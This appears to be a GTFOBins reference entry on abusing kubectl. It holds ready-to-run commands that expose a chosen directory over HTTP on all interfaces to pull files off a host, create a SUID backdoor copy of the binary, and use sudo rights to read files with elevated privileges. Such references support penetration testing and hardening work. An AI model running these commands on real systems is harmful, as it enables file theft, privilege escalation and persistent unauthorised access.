# GTFOBin: kubectl

It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`.

## File upload

It can exfiltrate files on the network.

```
LFILE=dir_to_serve
kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which kubectl) .

LFILE=dir_to_serve
./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=dir_to_serve
sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
```